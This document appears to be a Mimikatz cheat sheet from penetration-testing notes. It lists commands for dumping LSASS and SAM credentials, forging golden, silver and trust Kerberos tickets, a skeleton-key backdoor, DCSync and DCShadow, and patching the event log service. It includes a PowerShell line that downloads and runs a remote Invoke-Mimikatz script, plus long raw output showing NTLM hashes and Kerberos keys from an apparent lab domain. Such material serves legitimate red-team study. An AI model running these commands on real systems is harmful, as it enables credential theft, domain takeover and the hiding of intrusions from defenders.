# Comandos

## **Comunes**

```c
token::elevate
token::revert
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```

### **Dump Hashes**

```c
.\mimikatz.exe
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

### **Pass the Ticket**

```c
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

### **Forging Golden Ticket**

```
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
misc::cmd
klist
dir \\<RHOST>\admin$
```

### **Skeleton Key**

```
privilege::debug
misc::skeleton
net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

## Powershell

{% code overflow="wrap" %}
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1');
Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets"'
```
{% endcode %}

## Extracción de credenciales

### LM and Clear-Text in memory <a href="#lm-and-clear-text-in-memory" id="lm-and-clear-text-in-memory"></a>

From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:

* **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
* **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
  1. Modifying the registry at _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.

Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.

#### Counteracting SeDebugPrivilege Removal <a href="#counteracting-sedebugprivilege-removal" id="counteracting-sedebugprivilege-removal"></a>

Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:

bash

{% code overflow="wrap" %}
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
{% endcode %}

This allows the dumping of the <mark style="background-color:green;">`lsass.exe`</mark> memory to a file, which can then be analyzed on another system to extract credentials:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

### Mimikatz Options <a href="#mimikatz-options" id="mimikatz-options"></a>

Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:

**Clearing Event Logs**

* **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
* Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).

**Experimental Feature: Patching the Event Service**

* **Command**: `event::drop`
* This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
* Example: `mimikatz "privilege::debug" "event::drop" exit`
* The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
* The `event::drop` command then patches the Event Logging service.

#### Kerberos Ticket Attacks <a href="#kerberos-ticket-attacks" id="kerberos-ticket-attacks"></a>

#### Golden Ticket Creation <a href="#golden-ticket-creation" id="golden-ticket-creation"></a>

A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:

* Command: `kerberos::golden`
* Parameters:
  * `/domain`: The domain name.
  * `/sid`: The domain's Security Identifier (SID).
  * `/user`: The username to impersonate.
  * `/krbtgt`: The NTLM hash of the domain's KDC service account.
  * `/ptt`: Directly injects the ticket into memory.
  * `/ticket`: Saves the ticket for later use.

Example:

{% code overflow="wrap" %}
```powershell
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
{% endcode %}

#### Silver Ticket Creation <a href="#silver-ticket-creation" id="silver-ticket-creation"></a>

Silver Tickets grant access to specific services. Key command and parameters:

* Command: Similar to Golden Ticket but targets specific services.
* Parameters:
  * `/service`: The service to target (e.g., cifs, http).
  * Other parameters similar to Golden Ticket.

Example:

{% code overflow="wrap" %}
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
{% endcode %}

#### Trust Ticket Creation <a href="#trust-ticket-creation" id="trust-ticket-creation"></a>

Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:

* Command: Similar to Golden Ticket but for trust relationships.
* Parameters:
  * `/target`: The target domain's FQDN.
  * `/rc4`: The NTLM hash for the trust account.

Example:

{% code overflow="wrap" %}
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
{% endcode %}

#### Additional Kerberos Commands <a href="#additional-kerberos-commands" id="additional-kerberos-commands"></a>

* **Listing Tickets**:
  * Command: `kerberos::list`
  * Lists all Kerberos tickets for the current user session.
* **Pass the Cache**:
  * Command: `kerberos::ptc`
  * Injects Kerberos tickets from cache files.
  * Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
* **Pass the Ticket**:
  * Command: `kerberos::ptt`
  * Allows using a Kerberos ticket in another session.
  * Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
* **Purge Tickets**:
  * Command: `kerberos::purge`
  * Clears all Kerberos tickets from the session.
  * Useful before using ticket manipulation commands to avoid conflicts.

#### Active Directory Tampering <a href="#active-directory-tampering" id="active-directory-tampering"></a>

* **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
  * `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
* **DCSync**: Mimic a DC to request password data.
  * `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

#### Credential Access <a href="#credential-access" id="credential-access"></a>

* **LSADUMP::LSA**: Extract credentials from LSA.
  * `mimikatz "lsadump::lsa /inject" exit`
* **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
  * _No specific command provided for NetSync in original context._
* **LSADUMP::SAM**: Access local SAM database.
  * `mimikatz "lsadump::sam" exit`
* **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
  * `mimikatz "lsadump::secrets" exit`
* **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
  * `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
* **LSADUMP::Trust**: Retrieve trust authentication information.
  * `mimikatz "lsadump::trust" exit`

#### Miscellaneous <a href="#miscellaneous" id="miscellaneous"></a>

* **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
  * `mimikatz "privilege::debug" "misc::skeleton" exit`

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

* **PRIVILEGE::Backup**: Acquire backup rights.
  * `mimikatz "privilege::backup" exit`
* **PRIVILEGE::Debug**: Obtain debug privileges.
  * `mimikatz "privilege::debug" exit`

#### Credential Dumping <a href="#credential-dumping" id="credential-dumping"></a>

* **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
  * `mimikatz "sekurlsa::logonpasswords" exit`
* **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
  * `mimikatz "sekurlsa::tickets /export" exit`

#### Sid and Token Manipulation <a href="#sid-and-token-manipulation" id="sid-and-token-manipulation"></a>

* **SID::add/modify**: Change SID and SIDHistory.
  * Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  * Modify: _No specific command for modify in original context._
* **TOKEN::Elevate**: Impersonate tokens.
  * `mimikatz "token::elevate /domainadmin" exit`

#### Terminal Services <a href="#terminal-services" id="terminal-services"></a>

* **TS::MultiRDP**: Allow multiple RDP sessions.
  * `mimikatz "ts::multirdp" exit`
* **TS::Sessions**: List TS/RDP sessions.
  * _No specific command provided for TS::Sessions in original context._

#### Vault <a href="#vault" id="vault"></a>

* Extract passwords from Windows Vault.
  * `mimikatz "vault::cred /patch" exit`

{% code overflow="wrap" %}
```
PS C:\Users\adminwebserver\Desktop> .\mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsadump::sam' 'lsadump::secrets' exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

708     {0;000003e7} 1 D 20361          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000828d1} 2 F 2370414     SPARTANCYBERSEC\adminwebserver  S-1-5-21-1861162130-2580302541-221646211-1130   (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 2408646     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 534822 (00000000:00082926)
Session           : RemoteInteractive from 2
User Name         : adminwebserver
Domain            : SPARTANCYBERSEC
Logon Server      : FIRST-DC
Logon Time        : 11/6/2023 12:17:35 AM
SID               : S-1-5-21-1861162130-2580302541-221646211-1130
        msv :
         [00000003] Primary
         * Username : adminwebserver
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 64fbae31cc352fc26af97cbdef151e03
         * SHA1     : c220d333379050d852f3e65b010a817712b8c176
         * DPAPI    : ade33bd531fcf91dc0463eed20cd825d
        tspkg :
        wdigest :
         * Username : adminwebserver
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : adminwebserver
         * Domain   : SPARTANCYBERSEC.CORP
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 534737 (00000000:000828d1)
Session           : RemoteInteractive from 2
User Name         : adminwebserver
Domain            : SPARTANCYBERSEC
Logon Server      : FIRST-DC
Logon Time        : 11/6/2023 12:17:35 AM
SID               : S-1-5-21-1861162130-2580302541-221646211-1130
        msv :
         [00000003] Primary
         * Username : adminwebserver
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 64fbae31cc352fc26af97cbdef151e03
         * SHA1     : c220d333379050d852f3e65b010a817712b8c176
         * DPAPI    : ade33bd531fcf91dc0463eed20cd825d
        tspkg :
        wdigest :
         * Username : adminwebserver
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : adminwebserver
         * Domain   : SPARTANCYBERSEC.CORP
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 509514 (00000000:0007c64a)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/6/2023 12:17:33 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
         * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : WEBSERVER$
         * Domain   : spartancybersec.corp
         * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 509498 (00000000:0007c63a)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/6/2023 12:17:33 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
         * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : WEBSERVER$
         * Domain   : spartancybersec.corp
         * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 508492 (00000000:0007c24c)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/6/2023 12:17:33 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
         * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : WEBSERVER$
         * Domain   : spartancybersec.corp
         * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 45151 (00000000:0000b05f)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/6/2023 12:16:14 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
         * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : WEBSERVER$
         * Domain   : spartancybersec.corp
         * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEBSERVER$
Domain            : SPARTANCYBERSEC
Logon Server      : (null)
Logon Time        : 11/6/2023 12:16:14 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
         * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : webserver$
         * Domain   : SPARTANCYBERSEC.CORP
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 26036 (00000000:000065b4)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/6/2023 12:16:14 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
         * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : WEBSERVER$
         * Domain   : spartancybersec.corp
         * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 26012 (00000000:0000659c)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/6/2023 12:16:14 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
         * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : WEBSERVER$
         * Domain   : spartancybersec.corp
         * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/6/2023 12:16:17 AM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/6/2023 12:16:14 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 45216 (00000000:0000b0a0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/6/2023 12:16:14 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 7d0c4cdc32724b99ef4459147401471a
         * SHA1     : cd54e4ac32cca2e2ad07df657a832d9ee1cabe04
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : WEBSERVER$
         * Domain   : spartancybersec.corp
         * Password : de ce 87 d1 ac 7b 8a ff c5 3b db 11 1d bd 9f 81 ca 32 f1 c5 cc 3f 89 cc 95 80 7a 97 1c 5d 2d 8b 28 af 7d 25 1a 53 7e b9 5c b9 2a 23 6a fb ca bb 9e 20 16 d4 3c f6 7e b4 b4 76 48 c6 b7 10 25 9a 07 b5 07 b2 7f d2 b1 b0 a1 b0 f9 ce a1 92 a7 26 3d 0d ff ca d8 16 5b 60 9d 20 64 ea d9 0b f5 5a c0 0f 79 1f a0 b4 e3 43 cd 63 d1 ec 14 f8 5d bb 4c e0 22 da 1e 83 6f 1a eb 39 82 cd 45 97 23 ea a4 ef d0 52 72 96 cb a1 f5 1c 07 ea ef cb 45 17 7b 5a f0 0b 8b 57 bb 8f 1e 35 2f f3 55 57 61 5b 4f 12 2f 51 11 c2 1b 60 59 39 c6 df 0c 06 9b 11 db 70 92 9e 90 6b 6c 49 f8 f7 d4 af 4c 86 21 87 e4 ea 57 50 a6 b7 87 ad 4d 61 c5 b0 35 84 79 c6 9d 26 8f a7 0f e7 3a e3 fb 34 24 88 27 fd c5 ae d5 61 67 1e eb 78 a7 05 dc 38 9a 9c 72 0a 44 cc
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 24887 (00000000:00006137)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/6/2023 12:16:13 AM
SID               :
        msv :
         [00000003] Primary
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
         * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEBSERVER$
Domain            : SPARTANCYBERSEC
Logon Server      : (null)
Logon Time        : 11/6/2023 12:16:13 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : SPARTANCYBERSEC
         * Password : (null)
        kerberos :
         * Username : webserver$
         * Domain   : SPARTANCYBERSEC.CORP
         * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
        ssp :
        credman :
        cloudap :

mimikatz(commandline) # lsadump::sam
Domain : WEBSERVER
SysKey : ea7b3f466f263386e6dc165bcde0d1d2
Local SID : S-1-5-21-35825707-945739770-2891244367

SAMKey : 0f38480331d27a37fb84a64691c96638

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: f47f6266f4bb428db65cd949e7537f52

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 95278d33a26e8418cde3b6bc618d5d4c

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-N0S1NB6Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 487149fe0751036e0aa497d82728570248f671894c39912e818bc058546478da
      aes128_hmac       (4096) : 95f019490c136ba744dd27b3248d862d
      des_cbc_md5       (4096) : 264a2c3df40ba886
    OldCredentials
      aes256_hmac       (4096) : 27d1fe245f22752ae07fa19e6c4cb8c9a711d23fa43041c3eba9dea1c46879f4
      aes128_hmac       (4096) : 2881481a8717f3d3a4377847a1099566
      des_cbc_md5       (4096) : 76315edf8a0191ea
    OlderCredentials
